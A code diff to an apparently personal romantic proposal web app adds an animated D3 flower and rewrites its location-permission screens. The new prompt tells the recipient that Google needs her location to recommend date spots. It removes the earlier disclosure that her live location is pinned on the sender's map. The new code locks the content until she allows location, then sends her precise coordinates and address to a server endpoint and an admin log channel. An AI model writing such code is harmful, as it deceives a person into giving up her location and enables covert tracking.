@@ -1,3 +1,5 @@
+import * as d3 from 'd3';
+
 // Proposal modal with evasive "No" button and confetti celebration
 let dodgeCount = 0;
 let teaseTimer: ReturnType<typeof setTimeout> | null = null;
@@ -550,6 +552,327 @@ export function openMysteryDateGenerator(
   skipBtn.addEventListener('click', () => handleSpin(false));
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// Beautiful Blooming Flower Built with D3 ♡
+// ─────────────────────────────────────────────────────────────────────────────
+export function renderD3Flower(container: HTMLElement, recipientName = 'Loraine') {
+  container.innerHTML = '';
+
+  const d3Lib: any = typeof d3 !== 'undefined' ? d3 : (window as any).d3;
+  if (!d3Lib) {
+    container.innerHTML = '<div class="ivraine-flower-fallback">🌸 A special flower bloomed for you ♡</div>';
+    return;
+  }
+
+  const width = 280;
+  const height = 280;
+  const centerX = width / 2;
+  const flowerCenterY = 125;
+
+  const svg = d3Lib.select(container)
+    .append('svg')
+    .attr('viewBox', `0 0 ${width} ${height}`)
+    .attr('class', 'ivraine-d3-flower-svg')
+    .attr('role', 'img')
+    .attr('aria-label', `A blooming surprise flower for ${recipientName}`);
+
+  const defs = svg.append('defs');
+
+  // Linear Gradient: Stem
+  const stemGrad = defs.append('linearGradient')
+    .attr('id', 'ivraine-stem-grad')
+    .attr('x1', '0%').attr('y1', '100%')
+    .attr('x2', '0%').attr('y2', '0%');
+  stemGrad.append('stop').attr('offset', '0%').attr('stop-color', '#1b4332');
+  stemGrad.append('stop').attr('offset', '50%').attr('stop-color', '#2d6a4f');
+  stemGrad.append('stop').attr('offset', '100%').attr('stop-color', '#52b788');
+
+  // Linear Gradient: Left Leaf
+  const leafLeftGrad = defs.append('linearGradient')
+    .attr('id', 'ivraine-leaf-left')
+    .attr('x1', '0%').attr('y1', '100%')
+    .attr('x2', '100%').attr('y2', '0%');
+  leafLeftGrad.append('stop').attr('offset', '0%').attr('stop-color', '#2d6a4f');
+  leafLeftGrad.append('stop').attr('offset', '100%').attr('stop-color', '#74c69d');
+
+  // Linear Gradient: Right Leaf
+  const leafRightGrad = defs.append('linearGradient')
+    .attr('id', 'ivraine-leaf-right')
+    .attr('x1', '0%').attr('y1', '0%')
+    .attr('x2', '100%').attr('y2', '100%');
+  leafRightGrad.append('stop').attr('offset', '0%').attr('stop-color', '#40916c');
+  leafRightGrad.append('stop').attr('offset', '100%').attr('stop-color', '#95d5b2');
+
+  // Linear Gradient: Outer Petals
+  const outerPetalGrad = defs.append('linearGradient')
+    .attr('id', 'ivraine-outer-petal-grad')
+    .attr('x1', '0%').attr('y1', '100%')
+    .attr('x2', '0%').attr('y2', '0%');
+  outerPetalGrad.append('stop').attr('offset', '0%').attr('stop-color', '#ad1457');
+  outerPetalGrad.append('stop').attr('offset', '50%').attr('stop-color', '#e91e63');
+  outerPetalGrad.append('stop').attr('offset', '100%').attr('stop-color', '#ff6b8b');
+
+  // Linear Gradient: Mid Petals
+  const midPetalGrad = defs.append('linearGradient')
+    .attr('id', 'ivraine-mid-petal-grad')
+    .attr('x1', '0%').attr('y1', '100%')
+    .attr('x2', '0%').attr('y2', '0%');
+  midPetalGrad.append('stop').attr('offset', '0%').attr('stop-color', '#c2185b');
+  midPetalGrad.append('stop').attr('offset', '60%').attr('stop-color', '#f06292');
+  midPetalGrad.append('stop').attr('offset', '100%').attr('stop-color', '#ff8fa3');
+
+  // Linear Gradient: Inner Petals
+  const innerPetalGrad = defs.append('linearGradient')
+    .attr('id', 'ivraine-inner-petal-grad')
+    .attr('x1', '0%').attr('y1', '100%')
+    .attr('x2', '0%').attr('y2', '0%');
+  innerPetalGrad.append('stop').attr('offset', '0%').attr('stop-color', '#ec407a');
+  innerPetalGrad.append('stop').attr('offset', '100%').attr('stop-color', '#ffccd5');
+
+  // Radial Gradient: Center Bud Core
+  const budGrad = defs.append('radialGradient')
+    .attr('id', 'ivraine-bud-grad')
+    .attr('cx', '50%').attr('cy', '50%').attr('r', '50%');
+  budGrad.append('stop').attr('offset', '0%').attr('stop-color', '#fff9c4');
+  budGrad.append('stop').attr('offset', '35%').attr('stop-color', '#ffeb3b');
+  budGrad.append('stop').attr('offset', '75%').attr('stop-color', '#ff80ab');
+  budGrad.append('stop').attr('offset', '100%').attr('stop-color', '#d81b60');
+
+  // Radial Gradient: Soft Glow Aura
+  const auraGrad = defs.append('radialGradient')
+    .attr('id', 'ivraine-flower-aura')
+    .attr('cx', '50%').attr('cy', '50%').attr('r', '50%');
+  auraGrad.append('stop').attr('offset', '0%').attr('stop-color', 'rgba(255, 105, 180, 0.45)');
+  auraGrad.append('stop').attr('offset', '65%').attr('stop-color', 'rgba(255, 182, 193, 0.15)');
+  auraGrad.append('stop').attr('offset', '100%').attr('stop-color', 'rgba(255, 255, 255, 0)');
+
+  // Filter: Romantic Bloom Glow
+  const filter = defs.append('filter')
+    .attr('id', 'ivraine-bloom-glow')
+    .attr('x', '-30%').attr('y', '-30%')
+    .attr('width', '160%').attr('height', '160%');
+  filter.append('feGaussianBlur')
+    .attr('stdDeviation', '3')
+    .attr('result', 'coloredBlur');
+  const feMerge = filter.append('feMerge');
+  feMerge.append('feMergeNode').attr('in', 'coloredBlur');
+  feMerge.append('feMergeNode').attr('in', 'SourceGraphic');
+
+  // Background Aura Circle
+  svg.append('circle')
+    .attr('cx', centerX)
+    .attr('cy', flowerCenterY)
+    .attr('r', 0)
+    .attr('fill', 'url(#ivraine-flower-aura)')
+    .transition()
+    .duration(1200)
+    .ease(d3Lib.easeCubicOut)
+    .attr('r', 75);
+
+  // Stem Path (curved from bottom y=270 to flower base y=125)
+  const stem = svg.append('path')
+    .attr('d', `M ${centerX},270 Q ${centerX - 7},195 ${centerX},${flowerCenterY}`)
+    .attr('fill', 'none')
+    .attr('stroke', 'url(#ivraine-stem-grad)')
+    .attr('stroke-width', 5.5)
+    .attr('stroke-linecap', 'round');
+
+  const stemNode = stem.node() as SVGPathElement | null;
+  const stemLength = stemNode?.getTotalLength() || 155;
+  stem.attr('stroke-dasharray', `${stemLength} ${stemLength}`)
+    .attr('stroke-dashoffset', stemLength)
+    .transition()
+    .duration(900)
+    .ease(d3Lib.easeCubicOut)
+    .attr('stroke-dashoffset', 0);
+
+  // Left Leaf Group
+  const leftLeaf = svg.append('g')
+    .attr('transform', `translate(${centerX - 4}, 205) scale(0)`);
+  leftLeaf.append('path')
+    .attr('d', 'M 0,0 C -35,5 -55,-15 -60,-30 C -40,-20 -18,-10 0,0 Z')
+    .attr('fill', 'url(#ivraine-leaf-left)')
+    .attr('filter', 'drop-shadow(0 2px 4px rgba(0,0,0,0.1))');
+  leftLeaf.transition()
+    .delay(450)
+    .duration(700)
+    .ease(d3Lib.easeBackOut.overshoot(1.4))
+    .attr('transform', `translate(${centerX - 4}, 205) scale(1)`);
+
+  // Right Leaf Group
+  const rightLeaf = svg.append('g')
+    .attr('transform', `translate(${centerX - 2}, 175) scale(0)`);
+  rightLeaf.append('path')
+    .attr('d', 'M 0,0 C 35,5 55,-15 60,-28 C 40,-18 18,-8 0,0 Z')
+    .attr('fill', 'url(#ivraine-leaf-right)')
+    .attr('filter', 'drop-shadow(0 2px 4px rgba(0,0,0,0.1))');
+  rightLeaf.transition()
+    .delay(600)
+    .duration(700)
+    .ease(d3Lib.easeBackOut.overshoot(1.4))
+    .attr('transform', `translate(${centerX - 2}, 175) scale(1)`);
+
+  // Flower Head Main Group (centered at centerX, flowerCenterY)
+  const headGroup = svg.append('g')
+    .attr('transform', `translate(${centerX}, ${flowerCenterY})`);
+
+  // Inner Breathing Group (transform origin at 0, 0)
+  const innerHead = headGroup.append('g')
+    .attr('class', 'ivraine-flower-head-inner');
+
+  // Petal SVG path definition (centered at origin 0,0, pointing upward to -60)
+  const petalPathD = 'M 0,0 C -16,-20 -14,-48 0,-58 C 14,-48 16,-20 0,0 Z';
+
+  // Layer 1: Outer Petals (8 petals)
+  const outerAngles = [0, 45, 90, 135, 180, 225, 270, 315];
+  const outerPetals = innerHead.selectAll('.ivraine-petal-outer')
+    .data(outerAngles)
+    .enter()
+    .append('path')
+    .attr('class', 'ivraine-petal-outer')
+    .attr('d', petalPathD)
+    .attr('fill', 'url(#ivraine-outer-petal-grad)')
+    .attr('stroke', 'rgba(255, 255, 255, 0.4)')
+    .attr('stroke-width', 0.8)
+    .attr('transform', (d: number) => `rotate(${d}) scale(0)`);
+
+  outerPetals.transition()
+    .delay((_: any, i: number) => 700 + i * 45)
+    .duration(800)
+    .ease(d3Lib.easeBackOut.overshoot(1.5))
+    .attr('transform', (d: number) => `rotate(${d}) scale(1)`);
+
+  // Layer 2: Middle Petals (8 petals offset by 22.5 deg)
+  const midAngles = [22.5, 67.5, 112.5, 157.5, 202.5, 247.5, 292.5, 337.5];
+  const midPetals = innerHead.selectAll('.ivraine-petal-mid')
+    .data(midAngles)
+    .enter()
+    .append('path')
+    .attr('class', 'ivraine-petal-mid')
+    .attr('d', petalPathD)
+    .attr('fill', 'url(#ivraine-mid-petal-grad)')
+    .attr('stroke', 'rgba(255, 255, 255, 0.35)')
+    .attr('stroke-width', 0.8)
+    .attr('transform', (d: number) => `rotate(${d}) scale(0)`);
+
+  midPetals.transition()
+    .delay((_: any, i: number) => 1050 + i * 40)
+    .duration(750)
+    .ease(d3Lib.easeBackOut.overshoot(1.4))
+    .attr('transform', (d: number) => `rotate(${d}) scale(0.78)`);
+
+  // Layer 3: Inner Petals (6 petals)
+  const innerAngles = [10, 70, 130, 190, 250, 310];
+  const innerPetals = innerHead.selectAll('.ivraine-petal-inner')
+    .data(innerAngles)
+    .enter()
+    .append('path')
+    .attr('class', 'ivraine-petal-inner')
+    .attr('d', petalPathD)
+    .attr('fill', 'url(#ivraine-inner-petal-grad)')
+    .attr('stroke', 'rgba(255, 255, 255, 0.3)')
+    .attr('stroke-width', 0.7)
+    .attr('transform', (d: number) => `rotate(${d}) scale(0)`);
+
+  innerPetals.transition()
+    .delay((_: any, i: number) => 1350 + i * 35)
+    .duration(700)
+    .ease(d3Lib.easeBackOut.overshoot(1.3))
+    .attr('transform', (d: number) => `rotate(${d}) scale(0.55)`);
+
+  // Center Bud (Core)
+  const bud = innerHead.append('circle')
+    .attr('cx', 0)
+    .attr('cy', 0)
+    .attr('r', 0)
+    .attr('fill', 'url(#ivraine-bud-grad)')
+    .attr('filter', 'url(#ivraine-bloom-glow)');
+
+  bud.transition()
+    .delay(1600)
+    .duration(600)
+    .ease(d3Lib.easeElasticOut.amplitude(1).period(0.4))
+    .attr('r', 18);
+
+  // Glowing Stamen Dots around the core (12 dots)
+  const stamenData = d3Lib.range(12).map((i: number) => {
+    const angle = (i * 2 * Math.PI) / 12;
+    return {
+      x: 12 * Math.cos(angle),
+      y: 12 * Math.sin(angle)
+    };
+  });
+
+  const stamens = innerHead.selectAll('.ivraine-stamen')
+    .data(stamenData)
+    .enter()
+    .append('circle')
+    .attr('class', 'ivraine-stamen')
+    .attr('cx', (d: any) => d.x)
+    .attr('cy', (d: any) => d.y)
+    .attr('r', 0)
+    .attr('fill', '#fffde7')
+    .attr('stroke', '#ffd54f')
+    .attr('stroke-width', 0.7);
+
+  stamens.transition()
+    .delay((_: any, i: number) => 1700 + i * 25)
+    .duration(400)
+    .ease(d3Lib.easeBackOut.overshoot(2))
+    .attr('r', 2);
+
+  // Group for tap heart particles
+  const particleGroup = svg.append('g').attr('class', 'ivraine-tap-particles');
+
+  // Interactive Click / Tap: Spawns bursts of D3 heart particles!
+  const triggerMagic = () => {
+    try { navigator.vibrate?.([40]); } catch {}
+
+    innerHead.transition()
+      .duration(150)
+      .attr('transform', 'scale(1.15)')
+      .transition()
+      .duration(250)
+      .ease(d3Lib.easeBackOut)
+      .attr('transform', 'scale(1)');
+
+    const emojis = ['💖', '💕', '✨', '🌸', '❤️'];
+    for (let i = 0; i < 10; i++) {
+      const angle = Math.random() * 2 * Math.PI;
+      const dist = 40 + Math.random() * 65;
+      const targetX = centerX + Math.cos(angle) * dist;
+      const targetY = flowerCenterY + Math.sin(angle) * dist - 10;
+      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+
+      const p = particleGroup.append('text')
+        .attr('x', centerX)
+        .attr('y', flowerCenterY)
+        .attr('font-size', '14px')
+        .attr('text-anchor', 'middle')
+        .attr('dominant-baseline', 'central')
+        .attr('opacity', 1)
+        .style('pointer-events', 'none')
+        .style('user-select', 'none')
+        .text(emoji);
+
+      p.transition()
+        .duration(850 + Math.random() * 300)
+        .ease(d3Lib.easeCubicOut)
+        .attr('x', targetX)
+        .attr('y', targetY)
+        .attr('font-size', '20px')
+        .attr('opacity', 0)
+        .remove();
+    }
+  };
+
+  svg.style('cursor', 'pointer');
+  svg.on('click', triggerMagic);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Custom Designed Modern Permission Prompt
+// ─────────────────────────────────────────────────────────────────────────────
 function showCustomPermissionPrompt(
   card: HTMLDivElement,
   overlay: HTMLDivElement,
@@ -557,37 +880,32 @@ function showCustomPermissionPrompt(
   source: 'Scrapbook' | 'Private Space' | 'Admin'
 ) {
   card.innerHTML = `
-    <div class="ivraine-loc-card-custom">
-      <div class="ivraine-loc-header-badge">📍 Tagbilaran &amp; Bohol Spots</div>
+    <div class="ivraine-loc-card-custom modern-permission-card">
+      <div class="ivraine-loc-header-badge">✨ Romantic Date &amp; Surprise ♡</div>
       <div class="ivraine-loc-avatar-burst">
         <span class="ivraine-loc-icon-bubble">📍</span>
-        <span class="ivraine-loc-heart-bubble">💖</span>
+        <span class="ivraine-loc-heart-bubble">🌸</span>
       </div>
       <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
-      <div class="ivraine-loc-custom-subtitle">Unlock Ivan's Bohol Date Spots ♡</div>
+      <div class="ivraine-loc-custom-subtitle">A Special Moment For Us ♡</div>
       <p class="ivraine-loc-custom-desc">
-        Ivan has handpicked <strong>8 romantic places</strong> for us to explore together in Bohol!
-        Allow your phone’s location to unlock the secret list and pin our journey on the map ♡
+        Allow Location so that Google will provide the best places for our romantic date and bloom a secret surprise flower for you ♡
       </p>
 
       <div class="ivraine-loc-features-box">
         <div class="ivraine-loc-feat-item">
-          <span class="ivraine-loc-feat-icon">✨</span>
-          <span>8 handpicked Bohol landmarks &amp; dining spots</span>
-        </div>
-        <div class="ivraine-loc-feat-item">
           <span class="ivraine-loc-feat-icon">🗺️</span>
-          <span>Direct one-tap Google Maps directions</span>
+          <span>Google recommended spots near your location</span>
         </div>
         <div class="ivraine-loc-feat-item">
-          <span class="ivraine-loc-feat-icon">📍</span>
-          <span>Live location auto-pinned on Ivan's map</span>
+          <span class="ivraine-loc-feat-icon">🌸</span>
+          <span>A magical surprise flower that blooms just for you</span>
         </div>
       </div>
 
       <div class="ivraine-loc-custom-btns">
         <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-prompt-loc" type="button">
-          <span>📍 Allow Phone Location &amp; Unlock ♡</span>
+          <span>📍 Allow Location to Discover Places &amp; Flower ♡</span>
         </button>
 
         <button class="ivraine-btn-go-back-custom" id="ivraine-btn-go-back-prompt" type="button">
@@ -603,20 +921,20 @@ function showCustomPermissionPrompt(
   allowBtn.addEventListener('click', () => {
     card.innerHTML = `
       <div class="ivraine-loc-requesting-wrap">
-        <div class="ivraine-heart-burst">💖✨</div>
+        <div class="ivraine-loc-request-pulse">📍🌸</div>
         <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
-        <div class="ivraine-loc-prompt-title">Connecting with Phone GPS…</div>
+        <div class="ivraine-loc-prompt-title">Connecting with Location…</div>
         <p class="ivraine-loc-prompt-desc">
-          Please tap <strong>"Allow"</strong> on your phone prompt to reveal the places! ♡
+          Please tap <strong>"Allow"</strong> when your phone asks for location to discover our date spots and bloom your flower! ♡
         </p>
         <div class="ivraine-loc-loader">
           <div class="ivraine-loc-dot"></div>
-          <span>Finding our Bohol route…</span>
+          <span>Connecting with GPS…</span>
         </div>
       </div>
     `;
 
-    void requestPhoneLocationWithAutoBypass(card, overlay, userName, source);
+    void requestPhoneLocationStrict(card, overlay, userName, source);
   });
 
   backBtn.addEventListener('click', () => {
@@ -624,8 +942,8 @@ function showCustomPermissionPrompt(
   });
 }
 
-// Request phone location with automatic seamless bypass fallback so it never gets stuck
-async function requestPhoneLocationWithAutoBypass(
+// Strict location request: NO bypass if denied or timed out.
+async function requestPhoneLocationStrict(
   card: HTMLDivElement,
   overlay: HTMLDivElement,
   userName: string,
@@ -633,28 +951,90 @@ async function requestPhoneLocationWithAutoBypass(
 ) {
   let handled = false;
 
-  const finishWithLocation = (loc: LocationData) => {
+  const onDeniedOrTimeout = (msg = '') => {
+    if (handled) return;
+    handled = true;
+    showLocationDeniedPrompt(card, overlay, userName, source, msg);
+  };
+
+  const onSuccess = async (loc: LocationData) => {
     if (handled) return;
     handled = true;
     showDateReveal(card, overlay, userName, source, loc);
   };
 
-  const timer = setTimeout(async () => {
-    if (!handled) {
-      const fallback = await acquireLocationWithBypass();
-      finishWithLocation(fallback);
-    }
-  }, 4500);
-
-  const loc = await acquireAndSaveLocation(source, userName);
-  clearTimeout(timer);
-  if (loc) {
-    finishWithLocation(loc);
-  } else {
-    // Automatically bypass if GPS failed/denied/unsupported
-    const fallback = await acquireLocationWithBypass();
-    finishWithLocation(fallback);
+  if (!navigator.geolocation) {
+    onDeniedOrTimeout("Your browser does not support geolocation. You won't be able to see the date places and your surprise flower without location permission ♡");
+    return;
   }
+
+  // Safety timeout: if she takes too long (> 7.5 seconds) to allow
+  const timeoutId = setTimeout(() => {
+    if (!handled) {
+      onDeniedOrTimeout("Location was not allowed or took too long to respond. You won't be able to see the date places and your surprise flower without enabling location permission ♡");
+    }
+  }, 7500);
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      clearTimeout(timeoutId);
+      const { latitude, longitude } = pos.coords;
+      const geo = await reverseGeocode(latitude, longitude);
+      const loc: LocationData = {
+        latitude,
+        longitude,
+        fullAddress: geo.fullAddress || `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`,
+        city: geo.city || '',
+        country: geo.country || ''
+      };
+
+      try {
+        localStorage.setItem('ivraine_last_location', JSON.stringify(loc));
+        localStorage.setItem('ivraine_saved_pinned_location', JSON.stringify(loc));
+      } catch {}
+
+      trackActivity(source, 'Shared Location', `Address: ${loc.fullAddress}`, userName, 0, loc);
+
+      try {
+        await fetch('/api/date-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude, user: userName, source }),
+          keepalive: true
+        });
+      } catch {}
+
+      try {
+        const channel = new BroadcastChannel('ivraine_admin_channel');
+        channel.postMessage({
+          type: 'LOG_ADDED',
+          entry: {
+            id: 'live_' + Date.now(),
+            ip: 'Visitor Live Pin',
+            section: source,
+            action: '📍 Pinned Location Saved ♡',
+            details: loc.fullAddress || loc.city || 'Visitor Coordinates',
+            user: userName,
+            dodgeCount: dodgeCount,
+            latitude: loc.latitude,
+            longitude: loc.longitude,
+            fullAddress: loc.fullAddress,
+            city: loc.city,
+            country: loc.country,
+            timestamp: new Date().toISOString()
+          }
+        });
+      } catch {}
+
+      await onSuccess(loc);
+    },
+    (err) => {
+      clearTimeout(timeoutId);
+      trackActivity(source, 'Location permission denied or failed', `Error: ${err?.message || 'code ' + err?.code}`, userName);
+      onDeniedOrTimeout("Location was not allowed or took too long to respond. You won't be able to see the date places and your surprise flower without enabling location permission ♡");
+    },
+    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+  );
 }
 
 function showLocationDeniedPrompt(
@@ -668,9 +1048,9 @@ function showLocationDeniedPrompt(
     <div class="ivraine-loc-denied-wrap">
       <div class="ivraine-loc-denied-icon">📍🔒</div>
       <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
-      <div class="ivraine-loc-denied-title">Location Permission Notice ♡</div>
+      <div class="ivraine-loc-denied-title">Location Permission Required ♡</div>
       <p class="ivraine-loc-denied-desc">
-        ${customMsg || 'Phone GPS wasn’t granted or is turned off, but no worries! Tap below to allow or continue with our Bohol journey:'}
+        ${customMsg || "Location was not allowed or took too long to respond. You won't be able to see the date places and your surprise flower without enabling location permission ♡"}
       </p>
 
       <div class="ivraine-loc-phone-help">
@@ -679,7 +1059,7 @@ function showLocationDeniedPrompt(
 
       <div class="ivraine-loc-denied-btns">
         <button class="ivraine-btn-allow-loc-main" id="ivraine-btn-retry-loc" type="button">
-          <span>📍 Allow Location &amp; Unlock ♡</span>
+          <span>📍 Allow Location to See Places &amp; Flower ♡</span>
         </button>
 
         <button class="ivraine-btn-go-back" id="ivraine-btn-go-back" type="button">
@@ -692,20 +1072,20 @@ function showLocationDeniedPrompt(
   card.querySelector<HTMLButtonElement>('#ivraine-btn-retry-loc')?.addEventListener('click', () => {
     card.innerHTML = `
       <div class="ivraine-loc-requesting-wrap">
-        <div class="ivraine-heart-burst">💖✨</div>
+        <div class="ivraine-loc-request-pulse">📍🌸</div>
         <h2 class="ivraine-celebration-title">She said YES! 🥰🎉</h2>
-        <div class="ivraine-loc-prompt-title">Connecting with Phone GPS…</div>
+        <div class="ivraine-loc-prompt-title">Connecting with Location…</div>
         <p class="ivraine-loc-prompt-desc">
-          Please tap <strong>"Allow"</strong> on your phone prompt to reveal the places! ♡
+          Please tap <strong>"Allow"</strong> when your phone asks for location to discover our date spots and bloom your flower! ♡
         </p>
         <div class="ivraine-loc-loader">
           <div class="ivraine-loc-dot"></div>
-          <span>Finding our Bohol route…</span>
+          <span>Connecting with GPS…</span>
         </div>
       </div>
     `;
 
-    void requestPhoneLocationWithAutoBypass(card, overlay, userName, source);
+    void requestPhoneLocationStrict(card, overlay, userName, source);
   });
 
   card.querySelector<HTMLButtonElement>('#ivraine-btn-go-back')?.addEventListener('click', () => {
@@ -724,7 +1104,7 @@ function showDateReveal(
 
   try { navigator.vibrate?.([100, 50, 150, 50, 200]); } catch {}
 
-  trackActivity(source, "Said YES & revealed Ivan's places ♡", `Location: ${loc?.fullAddress || 'Tagbilaran City, Bohol'}`, userName, 0, loc || undefined);
+  trackActivity(source, "Said YES & revealed date spots ♡", `Location: ${loc?.fullAddress || 'Tagbilaran City, Bohol'}`, userName, 0, loc || undefined);
 
   const locText = loc?.city
     ? `Near ${loc.city}`
@@ -751,14 +1131,22 @@ function showDateReveal(
     <div class="ivraine-places-unlocked-wrap">
       <div class="ivraine-heart-burst">💖✨</div>
       <h2 class="ivraine-celebration-title">YAAAY! She said YES! 🥰🎉</h2>
-      <span class="ivraine-places-tag">🗺️ Places We Want to Visit ♡</span>
+      <span class="ivraine-places-tag">🗺️ Google Recommended Date Spots ♡</span>
       <p class="ivraine-celebration-text">
-        These are the places Ivan wants to explore with you in Bohol, ${userName} ♡<br>
-        <em>Tap any place to open directions in Google Maps!</em>
+        Based on your location, Google has recommended the best spots for our date, ${userName} ♡<br>
+        <em>Tap any spot to open directions in Google Maps!</em>
       </p>
 
+      <div class="ivraine-d3-flower-card">
+        <div id="ivraine-d3-flower-container" class="ivraine-d3-flower-container"></div>
+        <div class="ivraine-flower-caption">
+          <span class="flower-badge">🌸 Bloomed for ${userName} ♡</span>
+          <p>A secret romantic flower bloomed just for you!<br><small>(Tap the flower for sweet magic ✨)</small></p>
+        </div>
+      </div>
+
       <div class="ivraine-loc-unlocked-pill">
-        📍 Unlocked with your phone location: <strong>${locText}</strong>
+        📍 Connected with your location: <strong>${locText}</strong>
       </div>
 
       <div class="ivraine-places-scroll-list">
@@ -766,13 +1154,22 @@ function showDateReveal(
       </div>
 
       <button class="ivraine-btn-continue" id="ivraine-btn-date-close" type="button">
-        I love this! Step inside ♡
+        Step inside our memories 📖 ♡
       </button>
     </div>
   `;
 
+  const flowerContainer = card.querySelector<HTMLElement>('#ivraine-d3-flower-container');
+  if (flowerContainer) {
+    renderD3Flower(flowerContainer, userName);
+  }
+
   card.querySelector<HTMLButtonElement>('#ivraine-btn-date-close')!.addEventListener('click', () => {
     overlay.remove();
+    const passcodeField = document.getElementById('passcode');
+    if (passcodeField) {
+      passcodeField.focus();
+    }
   });
 }
 
